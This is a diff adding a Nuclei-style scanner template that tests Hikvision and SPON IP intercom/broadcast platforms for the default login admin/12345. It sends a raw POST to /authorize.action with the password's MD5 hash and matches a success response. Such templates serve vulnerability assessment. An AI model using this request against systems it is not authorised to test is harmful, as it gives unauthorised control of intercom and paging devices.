@@ -1,0 +1,31 @@
+id: hikvision-spon-group-intercom-authorize-default-login
+
+info:
+  name: hikvision 群组对讲服务配置平台 or 世邦通信 SPON IP 网络对讲广播系统 - default-login
+  author: leadlife
+  severity: high
+  reference: https://www.cnvd.org.cn/flaw/show/CNVD-2021-34568
+  metadata:
+    verified:
+    fofa-query: 
+    tips: admin/12345
+  tags: hikvision,spon,intercom,default-login
+
+http:
+  - raw:
+      - |
+        POST /authorize.action HTTP/1.1
+        Host: {{Hostname}}
+
+        username=admin&userpsw=827ccb0eea8a706c4c34a16891f84e7b&language=zh_cn
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{"success": true, "msg": "OK"}'
+
+      - type: status
+        status:
+          - 200
